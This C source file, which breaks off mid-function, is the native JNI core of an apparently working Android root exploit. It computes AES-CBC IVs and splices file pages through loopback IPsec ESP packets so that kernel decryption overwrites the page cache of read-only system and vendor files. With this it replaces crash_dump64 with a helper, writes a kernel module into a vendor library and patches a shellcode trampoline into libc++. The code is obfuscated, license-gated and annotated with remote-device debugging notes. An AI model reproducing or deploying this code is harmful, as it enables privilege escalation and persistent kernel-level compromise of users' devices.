#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <jni.h>
#include "reporter.h"
#include "crypto_core.h"
#include "aes256.h"
#include "hmac_sha256.h"
#include "obf_strings.h"
#include "obf_rt.h"

/* 第二观测通道：native trace.log（定义在后，patch_hook 里先行调用） */
static void trace(const char *msg);

static jmethodID report_mid;
static char kCrashDump[64];

/* asm_str.c：libcxx.S 字符串区的运行时解密填充（必须在 JNI_OnLoad 里调用） */
void obf_asm_init(void);
/* asset_names.c：资产名表 + 公钥解密（带 SHA-256 完整性校验） + JNI 元数据 */
const char *asset_name(int id);
const char *jni_meta(int id);
int pk_decode(uint8_t *out, size_t out_cap, size_t *out_len);
int tool_decode(uint8_t *out, size_t out_cap, size_t *out_len);
void asset_ks(uint8_t *out, size_t n);
size_t asset_ks_len(void);

/* native entry points, registered dynamically as n0/n1/n2/n3 */
static jint n1(JNIEnv *env, jclass clz, jobject reporter_obj,
               jstring koTargetPath, jint encapPort, jint spi,
               jbyteArray aesCbcKey, jbyteArray hmacKey, jint icvLen,
               jint senderPort, jboolean softReboot);
static jboolean n0(JNIEnv *env, jclass clz, jobject reporter_obj,
                   jbyteArray lic, jbyteArray fp, jstring blobPath);
/* n2: 资产名/目标名/KMI 查表 —— 这些串不再躺进 dex */
static jstring n2(JNIEnv *env, jclass clz, jint id);
/* n3: 解密后的公钥 DER；资产被替换则校验失败返回 NULL */
static jbyteArray n3(JNIEnv *env, jclass clz);
/* n4: 解密后的 UMH 脚本（原 assets/tool）*/
static jbyteArray n4(JNIEnv *env, jclass clz);
/* n5: KO / daemon 的块流密钥（64 KiB）*/
static jbyteArray n5(JNIEnv *env, jclass clz);

#define G_METHODS_COUNT 6
static JNINativeMethod g_methods[G_METHODS_COUNT];

JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved __attribute__((unused))) {
    JNIEnv *env;
    (*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_4);
    jclass clz = (*env)->FindClass(env, OBF(0));
    report_mid = (*env)->GetMethodID(env, clz, OBF(1), OBF(2));
    jclass runner = (*env)->FindClass(env, OBF(3));
    g_methods[0].name = OBF(4);
    g_methods[0].signature = OBF(5);
    g_methods[0].fnPtr = (void *)n0;
    g_methods[1].name = OBF(6);
    g_methods[1].signature = OBF(7);
    g_methods[1].fnPtr = (void *)n1;
    g_methods[2].name = jni_meta(0);
    g_methods[2].signature = jni_meta(1);
    g_methods[2].fnPtr = (void *)n2;
    g_methods[3].name = jni_meta(2);
    g_methods[3].signature = jni_meta(3);
    g_methods[3].fnPtr = (void *)n3;
    g_methods[4].name = jni_meta(4);
    g_methods[4].signature = jni_meta(5);
    g_methods[4].fnPtr = (void *)n4;
    g_methods[5].name = jni_meta(6);
    g_methods[5].signature = jni_meta(7);
    g_methods[5].fnPtr = (void *)n5;
    obf_init_runtime();
    obf_fill(kCrashDump, sizeof(kCrashDump), OBF(8));
    /* libcxx.S 里的字符串现在是零填充，必须在任何 shellcode 落盘前填好 */
    obf_asm_init();
    if ((*env)->RegisterNatives(env, runner, g_methods, G_METHODS_COUNT) != 0)
        return JNI_ERR;
    return JNI_VERSION_1_4;
}

static jstring n2(JNIEnv *env, jclass clz __attribute__((unused)), jint id) {
    const char *s = asset_name((int)id);
    return s ? (*env)->NewStringUTF(env, s) : NULL;
}

static jbyteArray n3(JNIEnv *env, jclass clz __attribute__((unused))) {
    uint8_t buf[512];
    size_t len = 0;
    if (pk_decode(buf, sizeof(buf), &len) != 0 || len == 0) return NULL;
    jbyteArray out = (*env)->NewByteArray(env, (jsize)len);
    if (!out) return NULL;
    (*env)->SetByteArrayRegion(env, out, 0, (jsize)len, (const jbyte *)buf);
    /* 用完即清：明文 DER 不在 native 里多留一秒 */
    memset(buf, 0, sizeof(buf));
    return out;
}

static jbyteArray n5(JNIEnv *env, jclass clz __attribute__((unused))) {
    size_t n = asset_ks_len();
    uint8_t *buf = (uint8_t *)malloc(n);
    if (!buf) return NULL;
    asset_ks(buf, n);
    jbyteArray out = (*env)->NewByteArray(env, (jsize)n);
    if (!out) { free(buf); return NULL; }
    (*env)->SetByteArrayRegion(env, out, 0, (jsize)n, (const jbyte *)buf);
    free(buf);
    return out;
}

static jbyteArray n4(JNIEnv *env, jclass clz __attribute__((unused))) {
    static uint8_t buf[8192];
    size_t len = 0;
    if (tool_decode(buf, sizeof(buf), &len) != 0 || len == 0) return NULL;
    jbyteArray out = (*env)->NewByteArray(env, (jsize)len);
    if (!out) return NULL;
    (*env)->SetByteArrayRegion(env, out, 0, (jsize)len, (const jbyte *)buf);
    return out;
}


struct PatchRestore {
    const char *lib;
    uint64_t shell_off;
    size_t   shell_padded;
    char    *shell_orig;   /* heap-allocated original shellcode bytes */
    uint64_t tramp_aligned;
    uint8_t  tramp_orig[16];
    int      valid;
};

void reportfmt(struct Reporter *r, const char *fmt, ...) {
    if (!r) return;
#ifdef EXP_CLI
    va_list cv; va_start(cv, fmt);
    char cbuf[1024]; vsnprintf(cbuf, sizeof(cbuf), fmt, cv); va_end(cv);
    fprintf(stderr, OBF(204), cbuf);
    return;
#endif
    va_list va; va_start(va, fmt);
    char buf[1024]; vsnprintf(buf, sizeof(buf), fmt, va); va_end(va);
    jstring s = (*r->env)->NewStringUTF(r->env, buf);
    (*r->env)->CallVoidMethod(r->env, r->obj, report_mid, s);
    (*r->env)->ExceptionClear(r->env);
    (*r->env)->DeleteLocalRef(r->env, s);
}

/* 运行时追加换行：fmt 现在来自 OBF() 解密结果，无法再做编译期字面量拼接 */
void reportln(struct Reporter *r, const char *fmt, ...) {
    if (!r) return;
#ifdef EXP_CLI
    va_list cv; va_start(cv, fmt);
    char cbuf[1024]; int cn = vsnprintf(cbuf, sizeof(cbuf), fmt, cv); va_end(cv);
    if (cn > 0) fprintf(stderr, OBF(204), cbuf);
    return;
#endif
    va_list va; va_start(va, fmt);
    char buf[1024];
    int n = vsnprintf(buf, sizeof(buf), fmt, va);
    va_end(va);
    if (n < 0) return;
    if ((size_t)n >= sizeof(buf)) n = (int)sizeof(buf) - 1;
    size_t i = (size_t)n;
    if (i + 1 < sizeof(buf)) { buf[i] = '\n'; buf[i + 1] = 0; }
    jstring s = (*r->env)->NewStringUTF(r->env, buf);
    (*r->env)->CallVoidMethod(r->env, r->obj, report_mid, s);
    (*r->env)->ExceptionClear(r->env);
    (*r->env)->DeleteLocalRef(r->env, s);
}

static char    *libcxx_ko_target;
static uint8_t *libcxx_soft_reboot;

/* SA parameters set by Java via nativeRunAll() before any patching. */
static int      g_encap_port;
static int      g_sender_port;
static uint32_t g_spi;
static uint8_t  g_aes_key[32];
static uint8_t  g_hmac_key[32];
static int      g_icv_len;    /* auth truncation in bytes (128-bit → 16) */
static uint32_t g_seq = 1;   /* monotonically increasing per-write */

/* IV = AES256_ECB_DEC(key, old_content) XOR desired
 * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
 *   = AES_DEC(key, old_content) XOR IV
 *   = AES_DEC(key, old_content) XOR (AES_DEC(key, old_content) XOR desired)
 *   = desired
 */
static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
    uint8_t dec[16];
    aes256_ecb_decrypt(g_aes_key, old_content, dec);
    for (int i = 0; i < 16; i++)
        iv[i] = dec[i] ^ desired[i];
}

/* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
 * crash_dump64 has been overwritten with splicehelper which supports argv[3]=OBF(9).
 */
static int read_vendor_content(off_t offset, uint8_t buf[16], struct Reporter *reporter) {
    int rdpipe[2];
    if (pipe(rdpipe) < 0) { REPORTLN(OBF(10), strerror(errno)); return -1; }

    char offstr[24];
    snprintf(offstr, sizeof(offstr), OBF(11), (long)offset);

    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
    if (pid < 0) {
        REPORTLN(OBF(12), strerror(errno));
        close(rdpipe[0]); close(rdpipe[1]);
        return -1;
    }
    if (pid == 0) {
        close(rdpipe[0]);
        if (rdpipe[1] != 0) {
            if (dup2(rdpipe[1], 0) < 0) _exit(1);
            close(rdpipe[1]);
        }
        execl(kCrashDump, OBF(13), offstr, libcxx_ko_target, OBF(9), NULL);
        _exit(1);
    }
    close(rdpipe[1]);
    int status;
    TEMP_FAILURE_RETRY(waitpid(pid, &status, 0));
    int n = 0;
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
    close(rdpipe[0]);
    if (n != 16) {
        if (WIFEXITED(status)) {
            const char *const exit_meanings[] = {
                [0] = OBF(14),
                [1] = OBF(15),
                [2] = OBF(16),
                [3] = OBF(17),
            };
            int ec = WEXITSTATUS(status);
            const char *meaning = (ec < 4) ? exit_meanings[ec] : OBF(18);
            REPORTLN(OBF(19),
                     (long)offset, n, meaning);
        } else if (WIFSIGNALED(status))
            REPORTLN(OBF(20),
                     (long)offset, n, WTERMSIG(status));
        else
            REPORTLN(OBF(21),
                     (long)offset, n, status);
        return -1;
    }
    return 0;
}

/* Send one CBC write.
 * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
 * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
 * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
 * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
 */
static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
                            const uint8_t iv[16], const uint8_t old_content[16],
                            int use_helper, struct Reporter *reporter) {
    int ret = -1;

    int pfd[2];
    if (pipe(pfd) < 0) { REPORTLN(OBF(10), strerror(errno)); return -1; }
    fcntl(pfd[1], F_SETPIPE_SZ, 65536);

    /* ESP header: SPI(4) + seq(4) + IV(16) = 24 bytes */
    uint32_t seq = g_seq++;
    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(g_spi);
    *(uint32_t *)(hdr + 4) = htonl(seq);
    memcpy(hdr + 8, iv, 16);

    /* HMAC-SHA256 over ESP_hdr(8) || IV(16) || ciphertext(16) = 40 bytes */
    uint8_t hmac_msg[40];
    memcpy(hmac_msg,      hdr,         8);   /* SPI + seq */
    memcpy(hmac_msg + 8,  iv,          16);  /* IV */
    memcpy(hmac_msg + 24, old_content, 16);  /* ciphertext = file page */
    uint8_t hmac_full[32];
    hmac_sha256(g_hmac_key, 32, hmac_msg, 40, hmac_full);

    /* vmsplice header + IV (24 bytes) */
    struct iovec iov1 = {.iov_base = hdr, .iov_len = 24};
    if (vmsplice(pfd[1], &iov1, 1, SPLICE_F_GIFT) != 24) {
        REPORTLN(OBF(22), strerror(errno)); goto out_pipe;
    }

    /* splice ciphertext from file (16 bytes, page-cache reference) */
    if (use_helper) {
        char offstr[24];
        snprintf(offstr, sizeof(offstr), OBF(11), (long)offset);
        int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
        if (pid < 0) { REPORTLN(OBF(12), strerror(errno)); goto out_pipe; }
        if (pid == 0) {
            if (pfd[1] != 1 && dup2(pfd[1], 1) < 0) _exit(1);
            execl(kCrashDump, OBF(13), offstr, libcxx_ko_target, NULL);
            _exit(1);
        }
        int st;
        TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
            REPORTLN(OBF(23), st);
            goto out_pipe;
        }
    } else {
        off_t off = offset;
        if (splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE) != 16) {
            REPORTLN(OBF(24), strerror(errno)); goto out_pipe;
        }
    }

    /* vmsplice ICV (truncated HMAC) */
    struct iovec iov2 = {.iov_base = hmac_full, .iov_len = (size_t)g_icv_len};
    if (vmsplice(pfd[1], &iov2, 1, SPLICE_F_GIFT) != g_icv_len) {
        REPORTLN(OBF(25), strerror(errno)); goto out_pipe;
    }

    /* splice pipe → UDP: 24 + 16 + icv_len bytes */
    {
        int total = 24 + 16 + g_icv_len;
        ssize_t s = splice(pfd[0], NULL, sk_send, NULL, total, 0);
        ret = (s == total) ? 0 : -1;
        if (ret) REPORTLN(OBF(26), s, total);
    }

out_pipe:
    close(pfd[0]); close(pfd[1]);
    return ret;
}

/* Patch len bytes of payload into file starting at file offset foff.
 * Writes in 16-byte CBC blocks.
 * For system files (use_helper=0): reads old_content with pread().
 * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
 * len must be a multiple of 16.
 */
static int patch_file_cbc(const char *path, const char *payload, size_t len,
                           size_t foff, int use_helper, struct Reporter *reporter) {
    if (len % 16 != 0) {
        REPORTLN(OBF(27), len);
        return -1;
    }

    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { REPORTLN(OBF(28), strerror(errno)); return -1; }
    {
        int opt = 1;
        setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        struct sockaddr_in src = {
            .sin_family = AF_INET,
            .sin_port   = htons((uint16_t)g_sender_port),
            .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
        };
        if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
            REPORTLN(OBF(29), g_sender_port, strerror(errno));
        struct sockaddr_in dst = {
            .sin_family = AF_INET,
            .sin_port   = htons((uint16_t)g_encap_port),
            .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
        };
        if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            REPORTLN(OBF(30), strerror(errno));
            close(sk_send); return -1;
        }
    }

    int file_fd = -1;
    if (!use_helper) {
        file_fd = open(path, O_RDONLY);
        if (file_fd < 0) {
            REPORTLN(OBF(31), path, strerror(errno));
            close(sk_send); return -1;
        }
    }

    int rc = 0;
    for (size_t i = 0; i < len / 16; i++) {
        off_t off = (off_t)(foff + i * 16);
        uint8_t old_content[16] = {0};

        if (use_helper) {
            if (read_vendor_content(off, old_content, reporter) < 0) {
                rc = -1; break;
            }
        } else {
            if (pread(file_fd, old_content, 16, off) != 16) {
                REPORTLN(OBF(32), (long)off, strerror(errno));
                rc = -1; break;
            }
        }

        uint8_t desired[16] = {0};
        memcpy(desired, payload + i * 16, 16);

        uint8_t iv[16];
        compute_iv(old_content, desired, iv);

        if (do_one_write_cbc(sk_send, file_fd, off, iv, old_content, use_helper, reporter) < 0) {
            REPORTLN(OBF(33), i, (long)off);
            rc = -1; break;
        }
        if (i % 32 == 0)
            REPORTLN(OBF(34), i * 16);
    }

    if (!use_helper) close(file_fd);
    close(sk_send);
    if (rc == 0) REPORTLN(OBF(35), len, path, foff);
    return rc;
}

/* ---- KO and splicehelper blobs (identical layout to SysRoot) ---- */

extern char libcxx_start[];
extern char libcxx_data[];
extern uint32_t libcxx_len;
extern char libcxx_first_inst_copy[];
extern uint32_t libcxx_ko_target_off;
extern uint32_t libcxx_soft_reboot_off;

int find_hook_target(const char *lib, const char *sym,
                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
                     struct Reporter *reporter);

/* KO and splicehelper bytes live ONLY in the encrypted payload bundle;
 * nothing exploitable is embedded in this library in plaintext. */

static int read_device_versions(int *andr, int *major, int *minor) {
    struct utsname u;
    if (uname(&u) != 0) return -1;
    if (sscanf(u.release, OBF(36), major, minor) != 2) return -1;
    const char *m = strstr(u.release, OBF(37));
    if (!m) return -1;
    *andr = atoi(m + 7);
    return (*andr > 0) ? 0 : -1;
}

/* Pad payload to a multiple of 16 bytes in a heap buffer.
 * Caller must free() the returned pointer.
 */
static char *pad16(const char *data, size_t len, size_t *out_len) {
    size_t padded = (len + 15) & ~(size_t)15;
    char *buf = calloc(1, padded);
    if (buf) memcpy(buf, data, len);
    *out_len = padded;
    return buf;
}


static int patch_ko(struct Reporter *reporter) {
    /* pick KO image */
    int andr = 0, major = 0, minor = 0;
    if (read_device_versions(&andr, &major, &minor) != 0) {
        REPORTLN(OBF(38)); return 1;
    }
    /* member lookup from the decrypted bundle (poisoned runs get
     * misdirected to a wrong member by crypto_core) */
    char kmi[40];
    snprintf(kmi, sizeof(kmi), OBF(39), andr, major, minor);
    size_t ko_len = 0;
    const uint8_t *ko_data = lic_bundle_get(kmi, &ko_len);
    if (!ko_data) {
        int n = lic_bundle_count();
        char tail[16];
        snprintf(tail, sizeof(tail), OBF(40), major, minor);
        size_t tl = strlen(tail);
        for (int i = 0; i < n && !ko_data; i++) {
            const char *nm = lic_bundle_name(i);
            if (!nm) continue;
            size_t nl = strnlen(nm, 32);
            if (nl > tl && !memcmp(nm + nl - tl, tail, tl)) {
                REPORTLN(OBF(41), nm);
                ko_data = lic_bundle_data(i, &ko_len);
            }
        }
    }
    if (!ko_data) {
        REPORTLN(OBF(42), kmi); return 1;
    }
    REPORTLN(OBF(43), kmi, ko_len);

    /* patch #1: write splicehelper into crash_dump64 page cache.
     * After this, exec'ing kCrashDump runs our splicehelper in crash_dump
     * SELinux domain (exec transition on the path label) and can open vendor files. */
    size_t sh_len = 0;
    const uint8_t *sh = lic_bundle_get_splicer(&sh_len);
    if (!sh) { REPORTLN(OBF(44)); return 1; }
    size_t sh_len_padded;
    char *sh_buf = pad16((const char *)sh, sh_len, &sh_len_padded);
    if (!sh_buf) return -1;
    REPORTLN(OBF(45), sh_len_padded);
    int ret = patch_file_cbc(kCrashDump, sh_buf, sh_len_padded, 0, 0, reporter);
    if (ret) { free(sh_buf); REPORTLN(OBF(46), ret); return ret; }

    // Verify patch #1 actually landed in the page cache.
    {
        uint8_t verify[16];
        int vfd = open(kCrashDump, O_RDONLY);
        if (vfd >= 0) {
            ssize_t n = pread(vfd, verify, 16, 16);
            close(vfd);
            if (n == 16 && memcmp(verify, sh_buf + 16, 16) != 0) {
                REPORTLN(OBF(47));
                free(sh_buf);
                return -1;
            }
            REPORTLN(OBF(48));
        }
    }
    free(sh_buf);

    size_t ko_len_padded;
    char *ko_buf = pad16((const char *)ko_data, ko_len, &ko_len_padded);
    if (!ko_buf) return -1;

    /* patch #2: write KO into vendor lib via crash_dump bridge */
    REPORTLN(OBF(49), libcxx_ko_target, ko_len_padded);
    ret = patch_file_cbc(libcxx_ko_target, ko_buf, ko_len_padded, 0, 1, reporter);
    free(ko_buf);
    lic_scrub();   /* plaintext window closed */
    if (ret) REPORTLN(OBF(50), ret);
    return ret;
}

static int patch_hook(const char *lib, const char *sym,
                      char *stage_data, uint32_t stage_len, char *stage_start,
                      char *first_inst_copy,
                      struct Reporter *reporter, struct PatchRestore *restore) {
    uint64_t hook_off, shell_off; uint32_t first_insn;
    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, reporter)) {
        REPORTLN(OBF(51), lib); return 1;
    }
    REPORTLN(OBF(52), lib, hook_off, shell_off, stage_len);

    const uint32_t BRANCH = 0x14000000;
    uint32_t start_delta = (uint32_t)(stage_start - stage_data);
    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);
    /* v15: record the raw decision inputs - first_insn is what the hook site
     * currently holds, hook_insn is the branch we would write. If these
     * match we know the trampoline from a PREVIOUS run is still resident. */
    {
        char tb[80];
        snprintf(tb, sizeof tb, OBF(173),
                 first_insn, hook_insn);
        trace(tb);
    }

    if (first_insn == hook_insn) {
        REPORTLN(OBF(53), lib);
        /* v14: same-boot re-run detection - run.log gets reset on each run,
         * so a previous attempt on this boot is otherwise invisible in the
         * feedback zip. Trace it so stale-state runs can be told apart
         * from clean single-shot boots. */
        trace(OBF(170));
        return 0;
    }
    uint32_t jmpback = BRANCH |
        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
    *(uint32_t *)&stage_data[stage_len - 4] = jmpback;
    *(uint32_t *)&first_inst_copy[0] = first_insn;

    size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
    if (!buf) return -1;

    if (restore) {
        restore->lib = lib;
        restore->shell_off = shell_off;
        restore->shell_padded = padded;
        restore->shell_orig = malloc(padded);
        if (restore->shell_orig) {
            int rfd = open(lib, O_RDONLY);
            if (rfd < 0 || pread(rfd, restore->shell_orig, padded, (off_t)shell_off) != (ssize_t)padded) {
                free(restore->shell_orig); restore->shell_orig = NULL;
            }
            if (rfd >= 0) close(rfd);
        }
    }

    REPORTLN(OBF(54), lib);
    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0, reporter);
    free(buf);
    if (ret) { REPORTLN(OBF(55), lib); return ret; }

    {
        uint64_t aligned = hook_off & ~(uint64_t)15;
        int pos = (int)(hook_off & 15);
        uint8_t blk[16];
        int fd = open(lib, O_RDONLY);
        if (fd < 0 || pread(fd, blk, 16, (off_t)aligned) != 16) {
            REPORTLN(OBF(56), lib); if (fd >= 0) close(fd); return -1;
        }
        close(fd);
        if (restore) {
            restore->tramp_aligned = aligned;
            memcpy(restore->tramp_orig, blk, 16);
            restore->valid = 1;
        }
        blk[pos+0] = (uint8_t)(hook_insn      );
        blk[pos+1] = (uint8_t)(hook_insn >>  8);
        blk[pos+2] = (uint8_t)(hook_insn >> 16);
        blk[pos+3] = (uint8_t)(hook_insn >> 24);
        REPORTLN(OBF(57), lib, hook_off);
        ret = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0, reporter);
    }
    return ret;
}

static void restore_hook(struct PatchRestore *r, struct Reporter *reporter) {
    if (!r->valid) return;
    REPORTLN(OBF(58), r->lib);
    patch_file_cbc(r->lib, (char *)r->tramp_orig, 16, (size_t)r->tramp_aligned, 0, reporter);
    if (r->shell_orig) {
        REPORTLN(OBF(59), r->lib);
        patch_file_cbc(r->lib, r->shell_orig, r->shell_padded, (size_t)r->shell_off, 0, reporter);
    }
}

static void fadvise_drop(const char *path, struct Reporter *reporter) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) { REPORTLN(OBF(60), path, strerror(errno)); return; }
    posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
    close(fd);
    REPORTLN(OBF(61), path);
}

static int createOrphanProcess(struct Reporter *reporter) {
    int pid = fork();
    if (pid < 0) { REPORTLN(OBF(62), strerror(errno)); return -1; }
    if (pid == 0) {
        int pid2 = fork();
        if (pid2 == 0) {
            /* v15: announce the grandchild pid into trace.log so the window
             * loop can poll /proc/<pid>/stat and directly observe adoption
             * (ppid flipping to 1) and reaping (entry gone) by init - the
             * exact steps that must call the hooked ostream::sentry on this
             * boot. The remote 12+512 device never even created the mutex,
             * so the broken hop is somewhere on this chain. */
            char tb[64];
            snprintf(tb, sizeof tb, OBF(174), getpid());
            trace(tb);
            sleep(1);
            _exit(0);
        }
        _exit(0);
    }
    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
    return 0;
}

static int has_marker(const char *p) { return access(p, F_OK) == 0; }

/* ---- v8: UMH verdict via tool log ----
 * ksud late-load restores SELinux enforcing when it finishes; the UMH child
 * (u:r:kernel) is enforcing-blind afterwards (dontaudit'd - on-device runcon
 * test: it cannot even exec sh), so the LKM's trailing `touch /dev/xkm0|xkm1`
 * can never land. The tool writes its verdict into its own log fd instead
 * (opened while still permissive): /data/user_de/0/honor.root/files/tool.log.
 * Returns 1 on KSU_STATE_OK, -1 on KSU_STATE_FAIL, 0 when not yet there. */
static int tool_verdict(const char *path) {
    FILE *f = fopen(path, OBF(148));
    if (!f) return 0;
    char line[256];
    int hit = 0;
    while (!hit && fgets(line, sizeof line, f)) {
        if (strstr(line, OBF(149))) hit = 1;
        else if (strstr(line, OBF(150))) hit = -1;
    }
    fclose(f);
    return hit;
}

/* v13: second observation channel that does NOT depend on the JNI reporter
 * chain. If the UMH payload kills the app process (or the framework drops
 * our callbacks), run.log goes silent and even the timeout diagnostics are
 * lost with it (suspected on the remote-device run of 2026-10-08 19:28:
 * run.log ends at triggering with no verdict, no heartbeat, no timeout
 * line). trace() appends directly to the app's DE files dir from native
 * code - one open/write/close per event, so everything written before a
 * crash survives in the page cache. Timestamps are wall-clock so entries
 * align with snapshot.txt time= and the Java-side [HH:mm:ss] prefixes. */
static void trace(const char *msg) {
    int fd = open(OBF(167),
                  O_WRONLY | O_APPEND | O_CREAT, 0644);
    if (fd < 0) return;
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    struct tm tm;
    time_t sec = ts.tv_sec;
    localtime_r(&sec, &tm);
    char head[40];
    strftime(head, sizeof head, OBF(168), &tm);
    char line[256];
    int n = snprintf(line, sizeof line, OBF(169),
                     head, ts.tv_nsec / 1000000, msg);
    if (n > 0) TEMP_FAILURE_RETRY(write(fd, line, (size_t)n));
    close(fd);
}

/* ---- v15: trigger-chain observability helpers ----
 * The remote 12+512 device shows a stable picture: patches verify OK, the
 * libc++ hook site already carries the branch (page cache), yet the mutex
 * /dev/xkm is NEVER created - the shellcode's first line never executes.
 * Everything between the orphan fork and the shellcode entry is a black
 * box: the helpers below turn it into trace.log lines. */

/* latest GC_PID=<n> line written by the orphan grandchild */
static int find_gc_pid(void) {
    FILE *f = fopen(OBF(167), OBF(148));
    if (!f) return -1;
    char ln[256];
    int pid = -1;
    while (fgets(ln, sizeof ln, f)) {
        char *g = strstr(ln, OBF(175));
        if (g) pid = atoi(g + 7);
    }
    fclose(f);
    return pid;
}

/* ppid of <pid>; 0 = entry gone (already reaped), -1 = parse error */
static int read_ppid(int pid) {
    char p[64];
    snprintf(p, sizeof p, OBF(176), pid);
    FILE *f = fopen(p, OBF(148));
    if (!f) return 0;                    /* no entry -> already reaped */
    char buf[512];
    size_t n = fread(buf, 1, sizeof buf - 1, f);
    fclose(f);
    buf[n] = 0;
    char *rp = strrchr(buf, ')');        /* skip past the comm field */
    if (!rp) return -1;
    int ppid = -1;
    if (sscanf(rp + 1, OBF(177), &ppid) != 1) return -1;
    return ppid;
}

/* one xfrm_stat snapshot into a caller buffer; returns 0 on success */
static int xfrm_read(char *out, size_t cap) {
    FILE *f = fopen(OBF(178), OBF(148));
    if (!f) return -1;
    size_t n = fread(out, 1, cap - 1, f);
    fclose(f);
    out[n] = 0;
    return 0;
}

/* value of Name in a xfrm_stat snapshot text */
static long xfrm_val(const char *snap, const char *name) {
    const char *p = strstr(snap, name);
    if (!p) return -1;
    return atol(p + strlen(name));
}

static jint n1(JNIEnv *env, jclass clz __attribute__((unused)),
               jobject reporter_obj,
                                               jstring koTargetPath,
                                               jint encapPort, jint spi,
                                               jbyteArray aesCbcKey,
                                               jbyteArray hmacKey, jint icvLen,
                                               jint senderPort,
                                               jboolean softReboot) {
    struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;

    /* Locked build: same failure shape as a broken patch run. */
    if (!lic_is_unlocked()) {
        REPORTLN(OBF(63));
        return 3;
    }

    g_encap_port  = (int)encapPort;
    g_sender_port = (int)senderPort;
    g_spi         = (uint32_t)spi;
    g_seq         = 1;
    g_icv_len     = (int)icvLen;

    jbyte *kb = (*env)->GetByteArrayElements(env, aesCbcKey, NULL);
    memcpy(g_aes_key, kb, 32);
    (*env)->ReleaseByteArrayElements(env, aesCbcKey, kb, JNI_ABORT);

    jbyte *hb = (*env)->GetByteArrayElements(env, hmacKey, NULL);
    memcpy(g_hmac_key, hb, 32);
    (*env)->ReleaseByteArrayElements(env, hmacKey, hb, JNI_ABORT);

    libcxx_ko_target   = libcxx_data + libcxx_ko_target_off;
    const char *p = (*env)->GetStringUTFChars(env, koTargetPath, NULL);
    if (p) {
        strncpy(libcxx_ko_target, p, 63);
        libcxx_ko_target[63] = '\0';
        (*env)->ReleaseStringUTFChars(env, koTargetPath, p);
    }
    libcxx_soft_reboot = (uint8_t *)(libcxx_data + libcxx_soft_reboot_off);
    *libcxx_soft_reboot = softReboot ? 1 : 0;

    struct PatchRestore libcxx_r = {0};

    /* v15: stale-file cleanup moved BEFORE any patching. v1.4 deleted
     * trace.log down below - AFTER patch_hook had already traced the hook
     * state - erasing the single most diagnostic line (already-hooked) from
     * the remote feedback zip (fb-1791465343874). Deleting up front keeps
     * every later event. tool.log deletion keeps its v11 purpose (only THIS
     * run's verdict counts) since the verdict poll starts below. */
    remove(OBF(152));
    remove(OBF(167));
    {
        char tb[64];
        snprintf(tb, sizeof tb, OBF(179), getpid());
        trace(tb);
    }

    int rc = 3;
    if (patch_ko(reporter)) goto done;
    /* v197: REVERTED to sentry-only hook. The v1.9.6 dual hook caused a
     * boot loop on DNN (ios_base::init fires in dozens of root processes
     * at boot; the first trigger's insmod path fails outside init domain
     * and the whole boot loops). Sentry + multi-orphan stays the verified
     * safe configuration for generation A. Generation B (6.6.89) needs a
     * redesigned trigger context - NOT a blind symbol swap. */
    /* v200: the hook symbol is delivered by the Java layer via hook_sym.txt
     * in the device-protected files dir (device-profile driven). The built-in
     * sentry symbol is the fallback. */
    char hs_buf[160];
    const char *hook_sym = OBF(65);
    {
        const char *tl = OBF(167);              /* trace.log full path */
        char hp[160];
        snprintf(hp, sizeof hp, OBF(73), tl);
        char *slash = strrchr(hp, '/');
        if (slash) {
            strcpy(slash + 1, OBF(205));
            int hfd = open(hp, O_RDONLY);
            if (hfd >= 0) {
                ssize_t hn = read(hfd, hs_buf, sizeof hs_buf - 1);
                close(hfd);
                if (hn > 8) {
                    while (hn > 0 && (hs_buf[hn-1] == '\n' || hs_buf[hn-1] == '\r'
                                      || hs_buf[hn-1] == ' ')) hs_buf[--hn] = 0;
                    hs_buf[hn] = 0;
                    if (hn > 8) {
                        hook_sym = hs_buf;
